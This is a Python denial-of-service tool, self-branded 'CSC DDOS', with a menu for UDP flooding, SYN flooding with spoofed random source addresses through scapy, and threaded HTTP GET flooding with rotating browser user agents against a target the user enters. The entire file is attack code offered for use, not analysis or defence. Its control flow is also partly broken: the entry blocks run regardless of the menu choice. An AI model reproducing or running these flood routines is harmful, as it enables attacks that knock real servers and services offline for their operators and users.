import socket
import sys
import os
import requests
import threading
import random
import string
from scapy.all import IP, TCP, RandIP, RandShort, send
from threading import Thread
import time



user_agents = [

        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SQ1A.220205.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.125 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SQ1A.220205.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",

    ]


class TextColors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    PURPLE = '\033[35m'

def logo():
    print(TextColors.PURPLE + """
          
 ██████╗███████╗ ██████╗    ██████╗ ██████╗  ██████╗ ███████╗
██╔════╝██╔════╝██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║     ███████╗██║         ██║  ██║██║  ██║██║   ██║███████╗
██║     ╚════██║██║         ██║  ██║██║  ██║██║   ██║╚════██║
╚██████╗███████║╚██████╗    ██████╔╝██████╔╝╚██████╔╝███████║ made by mad
 ╚═════╝╚══════╝ ╚═════╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
          """ + TextColors.RESET)

logo()

def menu():
    print(TextColors.RED + "--------------------------------" + TextColors.RESET)
    print(TextColors.RED + "[1] UDP FLOODING" + TextColors.RESET)
    print(TextColors.RED + "[2] SYN FLOODING" + TextColors.RESET)
    print(TextColors.RED + "[3] HTTP FLOODING"  + TextColors.RESET)
    print(TextColors.RED + "-------------------------------- \n" + TextColors.RESET)

menu()

select = input(TextColors.WHITE + "CSC_DDOS:~$ : " + TextColors.RESET)

# UDP FLOODING

if select == "1" or select == "UDP":

 def udp_flood(target_ip, target_port, packet_count):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(2024)  

    for _ in range(packet_count):
        sock.sendto(bytes_to_send, (target_ip, target_port))
        print(TextColors.RED + f"[*] UDP FLOODING PACKET : {target_ip}:{target_port}" + TextColors.RESET )

if __name__ == "__main__":
    target_ip = input("[+] TARGET IP : ")  
    target_port = int(input("[+] PORT : ")) 
    packet_count = int(input("[+] PACKET? : ")) 
    
    udp_flood(target_ip, target_port, packet_count)

# SYN FLOODING

if select == "2" or select == "SYN":
 class SynFlood(Thread):
    def __init__(self, dst_IP, dst_PORT):
        Thread.__init__(self)
        self.dst_IP = dst_IP
        self.dst_PORT = dst_PORT
        self.running = True
        self.intercount = 0

    def run(self):
        while self.running:
            syn_packet = IP(src=RandIP(), dst=self.dst_IP) / TCP(flags='S', sport=RandShort(), dport=self.dst_PORT)
            send(syn_packet, verbose=0)  
            print(TextColors.RED + f'[+] SYNFLOOD PACKET : {self.intercount}' + TextColors.RESET)  
            self.intercount += 1

def main():
    dst_IP = input('[+] TARGET IP : ')
    dst_PORT = int(input('[+] PORT : '))
    run_thread = int(input('[+] Threads ✅ : '))
    
    threads = []
    for _ in range(run_thread):
        sf = SynFlood(dst_IP, dst_PORT)
        threads.append(sf)
        sf.start()

if __name__ == '__main__':
    main()

# HTTP FLOODING

if select == "3" or select == "HTTP":
 
 def flood(url):    
    while True:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            response = requests.get(url, headers=headers)
            print(f"[+] TARGET REQUEST ✅ {url}, : [*] SERVER 🌐 : {response.status_code} ")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

def start_flooding():
    target_url = input("[+] TARGET URL : ")
    print("[+] CSC DDOS HTTP FLOOD")
    
    for i in range(100000000): 
        thread = threading.Thread(target=flood, args=(target_url,))
        thread.start()

if __name__ == "__main__":
    while True:
        print(TextColors.RED + "[1] HTTP FLOODING " + TextColors.RESET)
        print(TextColors.RED + "[2] Exit " + TextColors.RESET)
        choice = input("CSC_DDOS:~$ : ")
        if choice == '1':
            start_flooding()
        elif choice == '2':
            print("Exiting...")
            break
        else:
            print("OPTION FAIL")


    
